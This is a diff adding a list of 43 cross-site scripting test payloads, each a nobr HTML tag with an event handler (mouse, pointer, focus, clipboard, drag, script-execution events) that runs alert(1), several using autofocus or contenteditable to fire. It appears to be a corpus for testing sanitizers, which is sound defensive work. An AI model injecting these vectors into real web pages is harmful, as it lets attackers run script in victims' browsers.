@@ -1,0 +1,43 @@
+<nobr draggable="true" ondrag="alert(1)">test</nobr>
+<nobr draggable="true" ondragend="alert(1)">test</nobr>
+<nobr draggable="true" ondragenter="alert(1)">test</nobr>
+<nobr draggable="true" ondragleave="alert(1)">test</nobr>
+<nobr draggable="true" ondragstart="alert(1)">test</nobr>
+<nobr id=x tabindex=1 onactivate=alert(1)></nobr>
+<nobr id=x tabindex=1 onbeforeactivate=alert(1)></nobr>
+<nobr id=x tabindex=1 onbeforedeactivate=alert(1)></nobr><input autofocus>
+<nobr id=x tabindex=1 ondeactivate=alert(1)></nobr><input id=y autofocus>
+<nobr id=x tabindex=1 onfocus=alert(1)></nobr>
+<nobr id=x tabindex=1 onfocusin=alert(1)></nobr>
+<nobr onafterscriptexecute=alert(1)><script>1</script>
+<nobr onbeforecopy="alert(1)" contenteditable>test</nobr>
+<nobr onbeforecut="alert(1)" contenteditable>test</nobr>
+<nobr onbeforepaste="alert(1)" contenteditable>test</nobr>
+<nobr onbeforescriptexecute=alert(1)><script>1</script>
+<nobr onblur=alert(1) tabindex=1 id=x></nobr><input autofocus>
+<nobr onclick="alert(1)">test</nobr>
+<nobr oncontextmenu="alert(1)">test</nobr>
+<nobr oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<nobr oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<nobr ondblclick="alert(1)" autofocus tabindex=1>test</nobr>
+<nobr onfocusout=alert(1) tabindex=1 id=x></nobr><input autofocus>
+<nobr onkeydown="alert(1)" contenteditable>test</nobr>
+<nobr onkeypress="alert(1)" contenteditable>test</nobr>
+<nobr onkeyup="alert(1)" contenteditable>test</nobr>
+<nobr onmousedown="alert(1)">test</nobr>
+<nobr onmouseenter="alert(1)">test</nobr>
+<nobr onmouseleave="alert(1)">test</nobr>
+<nobr onmousemove="alert(1)">test</nobr>
+<nobr onmouseout="alert(1)">test</nobr>
+<nobr onmouseover="alert(1)">test</nobr>
+<nobr onmouseup="alert(1)">test</nobr>
+<nobr onmousewheel=alert(1)>requires scrolling
+<nobr onpaste="alert(1)" contenteditable>test</nobr>
+<nobr onpointerdown=alert(1)>XSS</nobr>
+<nobr onpointerenter=alert(1)>XSS</nobr>
+<nobr onpointerleave=alert(1)>XSS</nobr>
+<nobr onpointermove=alert(1)>XSS</nobr>
+<nobr onpointerout=alert(1)>XSS</nobr>
+<nobr onpointerover=alert(1)>XSS</nobr>
+<nobr onpointerrawupdate=alert(1)>XSS</nobr>
+<nobr onpointerup=alert(1)>XSS</nobr>
